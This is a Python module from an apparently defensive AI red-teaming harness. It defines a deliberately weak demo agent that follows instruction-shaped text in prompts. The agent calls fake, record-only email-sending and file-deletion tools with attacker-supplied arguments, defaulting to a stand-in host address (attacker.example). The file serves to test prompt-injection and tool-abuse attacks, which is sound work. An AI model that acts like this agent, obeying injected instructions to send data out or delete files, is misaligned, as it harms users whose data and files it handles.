"""A deliberately-weak demo agent (ROADMAP §9) — deterministic, offline, fake tools.

``weak_agent`` naively follows instruction-shaped text in the prompt and calls the
matching fake tool with the attacker-supplied argument, so the bundled ``tool-abuse``
pack reproducibly succeeds against it. The tools are **fakes that only record** — no
real email, no filesystem write.
"""

from __future__ import annotations

import re

from ..sandbox import ToolContext
from ..targets.base import AdapterRequest

_EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
_PATH_RE = re.compile(r"(/[\w./-]+|[\w-]+\.[A-Za-z0-9]+)")

_SEND_TRIGGERS = ("send", "forward", "email", "exfiltrat")
_DELETE_TRIGGERS = ("delete", "remove", "rm ")


def _fake_send_email(*, to: str, body: str) -> str:
    """Fake recorder — returns a canned ack, sends nothing."""
    return "queued"


def _fake_delete_file(*, path: str) -> str:
    """Fake recorder — returns a canned ack, deletes nothing."""
    return "deleted"


def weak_agent(request: AdapterRequest, tools: ToolContext) -> str:
    # Fix #12: register the fakes per-call against the fresh ToolContext.
    tools.register("send_email", _fake_send_email)
    tools.register("delete_file", _fake_delete_file)

    prompt = request.prompt
    low = prompt.casefold()
    replies: list[str] = []

    if any(kw in low for kw in _SEND_TRIGGERS):
        match = _EMAIL_RE.search(prompt)
        to = match.group(0) if match else "external@attacker.example"
        tools.send_email(to=to, body=prompt)
        replies.append(f"Email sent to {to}.")

    if any(kw in low for kw in _DELETE_TRIGGERS):
        match = _PATH_RE.search(prompt)
        path = match.group(0) if match else "/data/important"
        tools.delete_file(path=path)
        replies.append(f"Deleted {path}.")

    return " ".join(replies) if replies else "Nothing to do."
